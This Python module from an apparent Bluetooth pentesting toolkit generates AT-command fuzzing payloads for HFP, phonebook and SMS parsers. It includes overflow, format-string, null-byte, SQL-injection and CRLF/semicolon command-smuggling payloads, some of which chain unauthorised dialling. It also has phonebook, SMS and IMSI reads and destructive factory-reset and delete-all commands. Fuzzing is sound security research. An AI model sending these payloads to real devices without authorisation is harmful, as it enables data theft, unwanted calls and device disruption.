"""AT Command Corpus Generator for Bluetooth HFP/Phonebook/SMS fuzzing.

Generates 300+ protocol-aware fuzzing payloads targeting AT command parsers
found in Bluetooth HFP Audio Gateways, headsets, and embedded modem stacks.
Covers the full HFP Service Level Connection sequence, call control, phonebook
access (3GPP TS 27.007), SMS commands (3GPP TS 27.005), device identification,
and injection/encoding attacks.

Reference specifications:
    - Bluetooth HFP v1.8 (Service Level Connection, feature bitmasks)
    - 3GPP TS 27.007 (Phonebook AT commands)
    - 3GPP TS 27.005 (SMS AT commands)
    - ITU-T V.250 (AT command syntax, 2048-char limit)

Usage:
    from blue_tap.fuzz.protocols.at_commands import ATCorpus

    corpus = ATCorpus.generate_all()
    stats = ATCorpus.corpus_stats()
"""

from __future__ import annotations


# ---------------------------------------------------------------------------
# HFP HF Feature Bits (sent in AT+BRSF=<value>)
# ---------------------------------------------------------------------------
HF_FEATURE_EC_NR: int = 1 << 0             # EC and/or NR function
HF_FEATURE_THREE_WAY: int = 1 << 1         # Three-way calling
HF_FEATURE_CLI: int = 1 << 2               # CLI presentation capability
HF_FEATURE_VOICE_RECOG: int = 1 << 3       # Voice recognition activation
HF_FEATURE_VOLUME: int = 1 << 4            # Remote volume control
HF_FEATURE_ENHANCED_STATUS: int = 1 << 5   # Enhanced call status
HF_FEATURE_ENHANCED_CONTROL: int = 1 << 6  # Enhanced call control
HF_FEATURE_CODEC_NEG: int = 1 << 7         # Codec negotiation
HF_FEATURE_HF_INDICATORS: int = 1 << 8     # HF Indicators
HF_FEATURE_ESCO_S4: int = 1 << 9           # eSCO S4 (T2) Settings

# All HF features enabled (bits 0-9)
HF_FEATURES_ALL: int = (1 << 10) - 1

# ---------------------------------------------------------------------------
# HFP AG Feature Bits (returned in +BRSF:<value>)
# ---------------------------------------------------------------------------
AG_FEATURE_THREE_WAY: int = 1 << 0         # Three-way calling
AG_FEATURE_EC_NR: int = 1 << 1             # EC and/or NR function
AG_FEATURE_VOICE_RECOG: int = 1 << 2       # Voice recognition
AG_FEATURE_INBAND_RING: int = 1 << 3       # In-band ring tone
AG_FEATURE_VOICE_TAG: int = 1 << 4         # Attach number to voice tag
AG_FEATURE_REJECT_CALL: int = 1 << 5       # Ability to reject call
AG_FEATURE_ENHANCED_STATUS: int = 1 << 6   # Enhanced call status
AG_FEATURE_ENHANCED_CONTROL: int = 1 << 7  # Enhanced call control
AG_FEATURE_EXTENDED_ERROR: int = 1 << 8    # Extended error result codes
AG_FEATURE_CODEC_NEG: int = 1 << 9         # Codec negotiation
AG_FEATURE_HF_INDICATORS: int = 1 << 10    # HF Indicators
AG_FEATURE_ESCO_S4: int = 1 << 11          # eSCO S4 (T2) Settings

# All AG features enabled (bits 0-11)
AG_FEATURES_ALL: int = (1 << 12) - 1

# ---------------------------------------------------------------------------
# Phonebook Memory Storage Types (3GPP TS 27.007)
# ---------------------------------------------------------------------------
PHONEBOOK_MEMORIES: list[str] = [
    "ME",  # Phone memory
    "SM",  # SIM memory
    "DC",  # Dialed calls
    "RC",  # Received calls
    "MC",  # Missed calls
    "FD",  # Fixed dialing
    "ON",  # Own numbers
    "LD",  # Last dial
    "EN",  # Emergency numbers
]

# ---------------------------------------------------------------------------
# SMS Message Statuses (3GPP TS 27.005)
# ---------------------------------------------------------------------------
SMS_STATUSES_TEXT: list[str] = [
    "REC UNREAD",
    "REC READ",
    "STO UNSENT",
    "STO SENT",
    "ALL",
]

SMS_STATUSES_PDU: list[int] = [0, 1, 2, 3, 4]


def at_cmd(cmd: str) -> bytes:
    """Encode an AT command string with \\r terminator.

    Args:
        cmd: The AT command text (without trailing \\r).

    Returns:
        UTF-8 encoded bytes with \\r appended.
    """
    return f"{cmd}\r".encode("utf-8", errors="surrogateescape")


class ATCorpus:
    """Generate protocol-aware AT command fuzzing payloads.

    Each static method produces a category of payloads targeting a specific
    AT command surface.  ``generate_all()`` combines every category into a
    single de-duplicated list suitable for feeding into a fuzzing campaign.

    All payloads are returned as ``bytes`` ready to send over an RFCOMM socket.
    """

    # ------------------------------------------------------------------
    # HFP Service Level Connection
    # ------------------------------------------------------------------
    @staticmethod
    def generate_hfp_slc_corpus() -> list[bytes]:
        """HFP Service Level Connection commands with valid and boundary values.

        Covers the mandatory SLC establishment sequence:
        AT+BRSF, AT+BAC, AT+CIND, AT+CMER, AT+CHLD=?, AT+BIND.

        Returns:
            List of encoded AT command payloads.
        """
        corpus: list[bytes] = []

        # --- AT+BRSF (feature bitmask exchange) ---
        brsf_values = [
            0, 1, 127, 255,
            HF_FEATURES_ALL,       # 1023 — all HF bits
            AG_FEATURES_ALL,       # 4095 — all AG bits (cross-role)
            2047,                  # 11 bits set
            0x7FFFFFFF,            # int32 max
            0xFFFFFFFF,            # uint32 max
            -1,                    # negative
        ]
        for val in brsf_values:
            corpus.append(at_cmd(f"AT+BRSF={val}"))
        # Non-numeric / edge-case BRSF values
        corpus.append(at_cmd("AT+BRSF=2.5"))
        corpus.append(at_cmd('AT+BRSF="abc"'))
        corpus.append(at_cmd("AT+BRSF="))
        corpus.append(at_cmd("AT+BRSF=0x7FFFFFFF"))  # hex string literal
        corpus.append(at_cmd("AT+BRSF=99999999999999"))  # exceeds 32-bit

        # --- AT+BAC (codec negotiation, HFP 1.6+) ---
        bac_values = [
            "1,2",                          # standard CVSD + mSBC
            "1",                            # CVSD only
            "1,2,3",                        # unknown third codec
            "0",                            # invalid codec ID
            "255",                          # boundary codec ID
            "1,2,3,4,5,6,7,8,9,10",        # too many codecs
            "",                             # empty
            "999",                          # out-of-range single
        ]
        for val in bac_values:
            corpus.append(at_cmd(f"AT+BAC={val}"))

        # --- AT+CIND (indicator mapping / query) ---
        corpus.append(at_cmd("AT+CIND=?"))   # test command
        corpus.append(at_cmd("AT+CIND?"))     # read command
        corpus.append(at_cmd("AT+CIND"))      # bare (malformed)
        corpus.append(at_cmd("AT+CIND="))     # empty set

        # --- AT+CMER (event reporting) ---
        cmer_args = [
            "3,0,0,1",                     # standard HFP
            "0,0,0,0",                     # all zeros
            "255,255,255,255",             # max per field
            "",                            # empty
            "3",                           # too few args
            "3,0,0,1,0,0,0",              # too many args
            "abc,def,ghi,jkl",            # non-numeric
        ]
        for args in cmer_args:
            corpus.append(at_cmd(f"AT+CMER={args}"))

        # --- AT+CHLD=? (three-way calling support query) ---
        corpus.append(at_cmd("AT+CHLD=?"))

        # --- AT+BIND (HF indicators, HFP 1.7+) ---
        bind_values = [
            "1,2",                          # standard (battery, safety)
            "0",                            # invalid indicator
            "255",                          # boundary
            "",                             # empty
            "1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",  # too many
            "999999",                       # overflow
            "-1",                           # negative
        ]
        for val in bind_values:
            corpus.append(at_cmd(f"AT+BIND={val}"))
        corpus.append(at_cmd("AT+BIND?"))     # query indicator status
        corpus.append(at_cmd("AT+BIND=?"))    # test command

        # --- AT+BCS (codec selection confirmation) ---
        for val in [1, 2, 0, 255, 999]:
            corpus.append(at_cmd(f"AT+BCS={val}"))

        # --- AT+BVRA enhanced voice recognition (HFP 1.8) ---
        corpus.append(at_cmd('AT+BVRA=2,"text search query"'))
        corpus.append(at_cmd('AT+BVRA=2,""'))                 # empty text
        corpus.append(at_cmd(f'AT+BVRA=2,"{"A" * 1024}"'))    # overflow text
        corpus.append(b'AT+BVRA=2,"\x00"\r')                  # null in text

        # --- AT+BIND (HF indicators: enhanced safety=1, battery level=2) ---
        corpus.append(at_cmd("AT+BIND=1,1"))
        corpus.append(at_cmd("AT+BIND=2,1"))

        # --- AT+BIEV (HF indicator value updates, HFP 1.7+) ---
        # Enhanced safety indicator (ID=1): off/on
        corpus.append(at_cmd("AT+BIEV=1,0"))
        corpus.append(at_cmd("AT+BIEV=1,1"))
        # Battery level indicator (ID=2): boundary values
        for val in [0, 50, 100]:
            corpus.append(at_cmd(f"AT+BIEV=2,{val}"))
        # Battery level boundary overflow
        corpus.append(at_cmd("AT+BIEV=2,101"))
        corpus.append(at_cmd("AT+BIEV=2,255"))
        corpus.append(at_cmd("AT+BIEV=2,-1"))
        # Invalid indicator IDs
        corpus.append(at_cmd("AT+BIEV=255,0"))
        corpus.append(at_cmd("AT+BIEV=0,0"))

        return corpus

    # ------------------------------------------------------------------
    # HFP Call Control
    # ------------------------------------------------------------------
    @staticmethod
    def generate_hfp_call_corpus() -> list[bytes]:
        """HFP call control commands with boundary values.

        Covers AT+CHLD, ATD, ATA, AT+CHUP, AT+BLDN, AT+VTS, AT+CLCC,
        AT+CCWA, AT+CLIP.

        Returns:
            List of encoded AT command payloads.
        """
        corpus: list[bytes] = []

        # --- AT+CHLD (call hold/multiparty) ---
        chld_actions = [
            "0", "1", "2", "3", "4",       # standard actions
            "99",                            # invalid action
        ]
        for action in chld_actions:
            corpus.append(at_cmd(f"AT+CHLD={action}"))
        # Indexed variants: 1x / 2x (release/private with specific call)
        for idx in range(10):
            corpus.append(at_cmd(f"AT+CHLD=1{idx}"))
            corpus.append(at_cmd(f"AT+CHLD=2{idx}"))
        # Edge cases
        corpus.append(at_cmd("AT+CHLD=abc"))
        corpus.append(at_cmd("AT+CHLD="))
        corpus.append(at_cmd("AT+CHLD=-1"))
        corpus.append(at_cmd("AT+CHLD=1999"))     # index overflow
        corpus.append(at_cmd("AT+CHLD=2147483647"))

        # --- ATD (dial) ---
        dial_numbers = [
            "",                              # empty
            "1",                             # single digit
            "911",                           # short
            "+14155551234",                  # international
            "1" * 20,                        # 20 digits
            "1" * 100,                       # 100 chars
            "1" * 1000,                      # 1000 chars
            "*#123#",                        # USSD-style
            "#31#14155551234",               # hash prefix (CLIR)
            "+",                             # plus only
        ]
        for num in dial_numbers:
            corpus.append(at_cmd(f"ATD{num};"))
        # Without semicolon (data call variant)
        corpus.append(at_cmd("ATD5551234"))

        # --- ATD> (memory dial) ---
        for idx in [0, 1, 99999]:
            corpus.append(at_cmd(f"ATD>SM{idx};"))
            corpus.append(at_cmd(f"ATD>ME{idx};"))

        # --- ATA, AT+CHUP, AT+BLDN ---
        corpus.append(at_cmd("ATA"))             # answer
        corpus.append(at_cmd("AT+CHUP"))         # hang up
        corpus.append(at_cmd("AT+BLDN"))         # last-number redial

        # --- AT+VTS (DTMF) ---
        dtmf_chars = list("0123456789ABCD*#")
        for ch in dtmf_chars:
            corpus.append(at_cmd(f"AT+VTS={ch}"))
        # Edge cases
        corpus.append(at_cmd("AT+VTS="))         # empty
        corpus.append(at_cmd("AT+VTS=X"))        # invalid char
        corpus.append(at_cmd("AT+VTS=ZZ"))       # multi-char invalid
        corpus.append(at_cmd(f"AT+VTS={'0' * 100}"))  # 100-char DTMF
        corpus.append(at_cmd("AT+VTS=0123456789"))     # multi-digit sequence
        corpus.append(b"AT+VTS=\x00\r")                # null in DTMF

        # --- Call status / waiting / caller ID ---
        corpus.append(at_cmd("AT+CLCC"))
        corpus.append(at_cmd("AT+CCWA=1"))
        corpus.append(at_cmd("AT+CLIP=1"))

        return corpus

    # ------------------------------------------------------------------
    # HFP Status / Query Commands
    # ------------------------------------------------------------------
    @staticmethod
    def generate_hfp_query_corpus() -> list[bytes]:
        """HFP status and query commands with boundary values.

        Covers volume (VGS/VGM), COPS, CNUM, NREC, BVRA, CMEE, BIA.

        Returns:
            List of encoded AT command payloads.
        """
        corpus: list[bytes] = []

        # --- AT+VGS / AT+VGM (speaker / mic volume, valid range 0-15) ---
        vol_values = [0, 1, 7, 15, 16, 255, 999, 65535, -1]
        for vol in vol_values:
            corpus.append(at_cmd(f"AT+VGS={vol}"))
            corpus.append(at_cmd(f"AT+VGM={vol}"))
        # Non-numeric volume
        corpus.append(at_cmd("AT+VGS="))
        corpus.append(at_cmd("AT+VGS=abc"))
        corpus.append(at_cmd("AT+VGM="))
        corpus.append(at_cmd("AT+VGM=abc"))

        # --- AT+COPS (network operator) ---
        corpus.append(at_cmd("AT+COPS?"))
        corpus.append(at_cmd("AT+COPS=3,0"))

        # --- AT+CNUM (subscriber number) ---
        corpus.append(at_cmd("AT+CNUM"))

        # --- AT+NREC (noise reduction / echo cancelling) ---
        for val in [0, 1, 2, 255]:
            corpus.append(at_cmd(f"AT+NREC={val}"))

        # --- AT+BVRA (voice recognition) ---
        for val in [0, 1, 2, 255]:
            corpus.append(at_cmd(f"AT+BVRA={val}"))

        # --- AT+CMEE (extended error codes) ---
        for val in [0, 1, 2, 255]:
            corpus.append(at_cmd(f"AT+CMEE={val}"))

        # --- AT+BIA (indicator activation) ---
        bia_patterns = [
            "1,1,1,1,1,1,1",               # all enabled
            "0,0,0,0,0,0,0",               # all disabled
            "1,0,1,0,1,0,1",               # alternating
            "",                              # empty
            "1",                             # single
            "1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1",  # too many
            "255,255,255",                  # overflow values
            "abc",                          # non-numeric
        ]
        for pattern in bia_patterns:
            corpus.append(at_cmd(f"AT+BIA={pattern}"))

        # --- AT+BSIR (in-band ring, AG->HF but test sending it) ---
        for val in [0, 1]:
            corpus.append(at_cmd(f"AT+BSIR={val}"))

        # --- AT+BINP (voice tag phone number) ---
        corpus.append(at_cmd("AT+BINP=1"))

        # --- S-register manipulation ---
        corpus.append(at_cmd("ATS0=1"))      # auto-answer
        corpus.append(at_cmd("ATS2=43"))     # change escape char
        corpus.append(at_cmd("ATS12=0"))     # DTMF duration to 0
        corpus.append(at_cmd("ATS0?"))       # read S-register

        return corpus

    # ------------------------------------------------------------------
    # Phonebook Commands (3GPP TS 27.007)
    # ------------------------------------------------------------------
    @staticmethod
    def generate_phonebook_corpus() -> list[bytes]:
        """Phonebook AT commands with boundary and malformed values.

        Covers AT+CPBS (select/query storage), AT+CPBR (read), AT+CPBF (find),
        AT+CPBW (write).

        Returns:
            List of encoded AT command payloads.
        """
        corpus: list[bytes] = []

        # --- AT+CPBS (select phonebook memory) ---
        for mem in PHONEBOOK_MEMORIES:
            corpus.append(at_cmd(f'AT+CPBS="{mem}"'))
        # Invalid / boundary memory types
        corpus.append(at_cmd('AT+CPBS=""'))
        corpus.append(at_cmd('AT+CPBS="AAAA"'))
        corpus.append(at_cmd(f'AT+CPBS="{"A" * 256}"'))
        corpus.append(b'AT+CPBS="\x00"\r')         # null byte in memory
        corpus.append(b'AT+CPBS=\x80\x81\x82\r')   # raw binary
        corpus.append(at_cmd("AT+CPBS=?"))           # test (list available)
        corpus.append(at_cmd("AT+CPBS?"))             # read (current storage)

        # --- AT+CPBR (read phonebook entries) ---
        cpbr_ranges = [
            "1",                             # single entry
            "1,10",                          # normal range
            "1,200",                         # large range
            "0,1",                           # zero-based start
            "1,99999",                       # huge end
            "200,1",                         # reversed range
            "-1,10",                         # negative start
            "0",                             # zero only
            "0,0",                           # zero-zero
            "1,1",                           # single via range
        ]
        for args in cpbr_ranges:
            corpus.append(at_cmd(f"AT+CPBR={args}"))

        # --- AT+CPBF (find phonebook entries) ---
        cpbf_searches = [
            "John",                          # normal
            "",                              # empty
            "A" * 1024,                      # oversized
            "\x00",                          # null byte
            "%n%s",                          # format string
            "%p%p%p%p",                      # pointer leak
            "' OR 1=1--",                    # SQL injection
        ]
        for search in cpbf_searches:
            corpus.append(f'AT+CPBF="{search}"\r'.encode(
                "utf-8", errors="surrogateescape"
            ))

        # --- AT+CPBW (write phonebook entry) ---
        # Normal write
        corpus.append(at_cmd('AT+CPBW=1,"+14155551234",145,"Test"'))
        # Huge number field
        corpus.append(
            f'AT+CPBW=1,"{"1" * 1000}",145,"Name"\r'.encode()
        )
        # Huge name field
        corpus.append(
            f'AT+CPBW=1,"+1",145,"{"A" * 500}"\r'.encode()
        )
        # Binary data in fields
        corpus.append(
            b'AT+CPBW=1,"\xff\xfe\xfd",145,"\xc0\xc1\xc2"\r'
        )
        # Overflow index
        corpus.append(
            at_cmd('AT+CPBW=999999,"+1",145,"Overflow"')
        )

        return corpus

    # ------------------------------------------------------------------
    # SMS Commands (3GPP TS 27.005)
    # ------------------------------------------------------------------
    @staticmethod
    def generate_sms_corpus() -> list[bytes]:
        """SMS AT commands with boundary and malformed values.

        Covers AT+CMGF (mode), AT+CMGL (list), AT+CMGR (read), AT+CMGS (send),
        AT+CMGD (delete), AT+CNMI (new message indications), and device info.

        Returns:
            List of encoded AT command payloads.
        """
        corpus: list[bytes] = []

        # --- AT+CMGF (message format: 0=PDU, 1=text) ---
        for val in [0, 1, 2, 255]:
            corpus.append(at_cmd(f"AT+CMGF={val}"))

        # --- AT+CMGL (list messages) ---
        # Text mode statuses
        for stat in SMS_STATUSES_TEXT:
            corpus.append(at_cmd(f'AT+CMGL="{stat}"'))
        # PDU mode statuses
        for stat in SMS_STATUSES_PDU:
            corpus.append(at_cmd(f"AT+CMGL={stat}"))
        # Invalid statuses
        corpus.append(at_cmd('AT+CMGL=""'))
        corpus.append(at_cmd('AT+CMGL="INVALID"'))
        corpus.append(at_cmd("AT+CMGL=99"))
        corpus.append(at_cmd("AT+CMGL=255"))

        # --- AT+CMGR (read message by index) ---
        for idx in [0, 1, 10, 99999, -1]:
            corpus.append(at_cmd(f"AT+CMGR={idx}"))

        # --- AT+CMGS (send message) ---
        # Normal send (text mode: prompt followed by body + Ctrl-Z)
        corpus.append(b'AT+CMGS="+14155551234"\r')
        # Oversized body with Ctrl-Z
        corpus.append(
            b'AT+CMGS="+1"\r' + b"A" * 4096 + b"\x1a"
        )
        # PDU mode oversized
        corpus.append(
            b"AT+CMGS=9999\r" + b"\x00" * 256 + b"\x1a"
        )
        # Ctrl-Z at unexpected position (in number field)
        corpus.append(b'AT+CMGS="\x1a"\r')

        # --- AT+CMGD (delete message) ---
        corpus.append(at_cmd("AT+CMGD=1,0"))
        corpus.append(at_cmd("AT+CMGD=1,4"))       # delete all
        corpus.append(at_cmd("AT+CMGD=99999,0"))

        # --- AT+CNMI (new message indication) ---
        corpus.append(at_cmd("AT+CNMI=2,1,0,0,0"))  # standard
        corpus.append(at_cmd("AT+CNMI=9,9,9,9,9"))  # all max-ish
        corpus.append(at_cmd("AT+CNMI=0,0,0,0,0"))  # all zero

        # --- Device info commands ---
        corpus.append(at_cmd("AT+CGSN"))     # IMEI
        corpus.append(at_cmd("AT+CIMI"))     # IMSI
        corpus.append(at_cmd("AT+CSQ"))      # signal quality
        corpus.append(at_cmd("AT+CBC"))      # battery charge
        corpus.append(at_cmd("AT+COPS?"))    # operator (also in query)

        return corpus

    # ------------------------------------------------------------------
    # Injection and Encoding Attacks
    # ------------------------------------------------------------------
    @staticmethod
    def generate_injection_corpus() -> list[bytes]:
        """Injection, overflow, encoding, and protocol-confusion attacks.

        Targets parser vulnerabilities: buffer overflows, null-byte injection,
        format strings, CRLF injection, unicode overflow, command concatenation,
        missing/double terminators, non-ASCII bytes, escape sequences.

        Returns:
            List of encoded AT command payloads.
        """
        corpus: list[bytes] = []

        # --- Buffer overflows ---
        for n in [128, 256, 512, 1024, 4096, 8192]:
            corpus.append(f"AT{'A' * n}\r".encode())
            corpus.append(f"AT+{'B' * n}\r".encode())
            corpus.append(f"AT+BRSF={'9' * n}\r".encode())

        # --- Null byte injection ---
        corpus.append(b"AT+BRSF=\x001\x005\r")           # nulls in value
        corpus.append(b"AT\x00+BRSF=127\r")               # null in prefix
        corpus.append(b"AT+CPBS=\"\x00ME\"\r")            # null in arg
        corpus.append(b"AT+BRSF=\x00127\r")               # null before value
        corpus.append(b"AT\x00+CPBR=1,100\r")             # null splitting cmd

        # --- Format strings ---
        fmt_strings = [
            "%n%n%x%x",
            "%s%s%s%s",
            "%p%p%p%p",
            "%.1024d",
            "%99999c",
        ]
        for fmt in fmt_strings:
            corpus.append(at_cmd(f"AT+CPBR={fmt}"))
            corpus.append(at_cmd(f"AT+BRSF={fmt}"))
        # Format strings in phonebook search
        corpus.append(at_cmd('AT+CPBF="%s%s%s%s%s"'))
        # Format strings in command name position
        corpus.append(at_cmd("AT+CIND%n%n%n%n"))
        corpus.append(at_cmd("AT+VGS=%x%x%x%x"))

        # --- CRLF injection (command injection via response splitting) ---
        corpus.append(b"AT+BRSF=127\r\nAT+CHUP\r\n")
        corpus.append(b"AT+CPBS=\"ME\"\r\nATD911;\r\n")
        corpus.append(b"AT+CIND?\r\nAT+CPBR=1,999\r")
        corpus.append(b"AT+VGS=5\r\r\nATD+11234567890;\r")

        # --- Embedded AT prefix in arguments ---
        corpus.append(at_cmd("AT+BRSF=AT+CHUP"))
        corpus.append(at_cmd("AT+VGS=AT+VGM=15"))

        # --- Unicode overflow ---
        for n in [128, 256, 512]:
            corpus.append(("AT+" + "\u00c4" * n + "\r").encode("utf-8"))

        # --- Missing terminator ---
        corpus.append(b"AT+BRSF=127")                     # no \r
        corpus.append(b"AT+CIND?")                         # no \r

        # --- Double / triple terminator ---
        corpus.append(b"AT+BRSF=127\r\r")
        corpus.append(b"AT+BRSF=127\r\n\r\n")
        corpus.append(b"AT+BRSF=127\r\n\r\n\r\n")

        # --- A/ repetition command ---
        corpus.append(b"A/\r")
        corpus.append(b"A/")                               # no terminator

        # --- Command concatenation (semicolon chaining) ---
        corpus.append(b"AT+BRSF=127;+CIND=?\r")
        corpus.append(b"AT+VGS=5;+CPBR=1,999\r")
        corpus.append(b"AT+VGS=5;D+11234567890;\r")
        # Mass concatenation: 500 commands in one line
        concat_500 = "AT" + ";+A" * 500 + "\r"
        corpus.append(concat_500.encode())
        # Even larger: 1000 commands
        concat_1000 = "AT" + ";+B" * 1000 + "\r"
        corpus.append(concat_1000.encode())

        # --- Empty and minimal commands ---
        corpus.append(b"\r")
        corpus.append(b"AT\r")
        corpus.append(b"AT+\r")
        corpus.append(b"AT+=\r")
        corpus.append(b"AT+BRSF=\r")
        corpus.append(b"\r\n")
        corpus.append(b"")                                  # zero-length

        # --- Non-ASCII bytes ---
        corpus.append(b"AT+\x80\x81\x82\r")
        corpus.append(b"AT+BRSF=\xff\xfe\r")
        # Full range of high bytes in command name
        corpus.append(bytes([0x41, 0x54, 0x2B]) + bytes(range(0x80, 0x100)) + b"\r")
        # Non-ASCII in phonebook fields
        corpus.append(b'AT+CPBF="\xff\xfe\xfd"\r')
        corpus.append(b'AT+CPBW=1,"+1",145,"\xc0\xc1\xc2"\r')

        # --- Mixed encoding: UTF-8 multibyte in arguments ---
        corpus.append("AT+CPBF=\"\u00e9\u00e8\u00ea\"\r".encode())
        corpus.append("AT+CPBW=1,\"+1\",145,\"\U0001f600\U0001f4a9\"\r".encode())

        # --- Escape sequences in arguments ---
        escape_seqs = ["\\\\", "\\'", '\\"', "\\0", "\\t", "\\n", "\\r"]
        for esc in escape_seqs:
            corpus.append(at_cmd(f"AT+CPBF=\"{esc}\""))

        return corpus

    # ------------------------------------------------------------------
    # Device Identification Commands
    # ------------------------------------------------------------------
    @staticmethod
    def generate_device_info_corpus() -> list[bytes]:
        """Device identification and control commands.

        Covers ATI (info), AT+GMI/GMM/GMR, AT+CGMI/CGMM/CGMR/CGSN,
        AT&F (factory reset), ATE (echo), ATZ (reset).

        Returns:
            List of encoded AT command payloads.
        """
        corpus: list[bytes] = []

        # --- ATI (manufacturer information, pages 0-9) ---
        corpus.append(at_cmd("ATI"))
        for page in range(10):
            corpus.append(at_cmd(f"ATI{page}"))

        # --- Generic modem identification (V.250) ---
        corpus.append(at_cmd("AT+GMI"))       # manufacturer
        corpus.append(at_cmd("AT+GMM"))       # model
        corpus.append(at_cmd("AT+GMR"))       # revision

        # --- GSM identification (3GPP TS 27.007) ---
        corpus.append(at_cmd("AT+CGMI"))      # manufacturer
        corpus.append(at_cmd("AT+CGMM"))      # model
        corpus.append(at_cmd("AT+CGMR"))      # revision
        corpus.append(at_cmd("AT+CGSN"))      # serial / IMEI

        # --- AT&F (factory reset) — potentially destructive ---
        # NOTE: This can reset device configuration. Include for completeness
        # but pentesters should be aware of the impact.
        corpus.append(at_cmd("AT&F"))
        corpus.append(at_cmd("AT&F0"))

        # --- ATE (echo on/off) ---
        corpus.append(at_cmd("ATE0"))         # echo off
        corpus.append(at_cmd("ATE1"))         # echo on

        # --- ATZ (modem reset) ---
        corpus.append(at_cmd("ATZ"))
        corpus.append(at_cmd("ATZ0"))

        # --- ATQ (quiet mode) ---
        corpus.append(at_cmd("ATQ0"))         # responses enabled
        corpus.append(at_cmd("ATQ1"))         # responses suppressed

        # --- ATV (verbose mode) ---
        corpus.append(at_cmd("ATV0"))         # numeric responses
        corpus.append(at_cmd("ATV1"))         # verbose responses

        return corpus

    # ------------------------------------------------------------------
    # Aggregation
    # ------------------------------------------------------------------
    @classmethod
    def generate_all(cls) -> list[bytes]:
        """Combine all corpus generators into a single de-duplicated list.

        Returns:
            List of unique encoded AT command payloads (300+ patterns).
        """
        combined: list[bytes] = []
        seen: set[bytes] = set()

        generators = [
            cls.generate_hfp_slc_corpus,
            cls.generate_hfp_call_corpus,
            cls.generate_hfp_query_corpus,
            cls.generate_phonebook_corpus,
            cls.generate_sms_corpus,
            cls.generate_injection_corpus,
            cls.generate_device_info_corpus,
        ]

        for gen in generators:
            for payload in gen():
                if payload not in seen:
                    seen.add(payload)
                    combined.append(payload)

        return combined

    @classmethod
    def corpus_stats(cls) -> dict[str, int]:
        """Return payload count per category and total.

        Returns:
            Dictionary mapping category names to payload counts,
            plus a ``total`` key with the de-duplicated grand total.
        """
        categories = {
            "hfp_slc": len(cls.generate_hfp_slc_corpus()),
            "hfp_call": len(cls.generate_hfp_call_corpus()),
            "hfp_query": len(cls.generate_hfp_query_corpus()),
            "phonebook": len(cls.generate_phonebook_corpus()),
            "sms": len(cls.generate_sms_corpus()),
            "injection": len(cls.generate_injection_corpus()),
            "device_info": len(cls.generate_device_info_corpus()),
        }
        categories["total"] = len(cls.generate_all())
        return categories
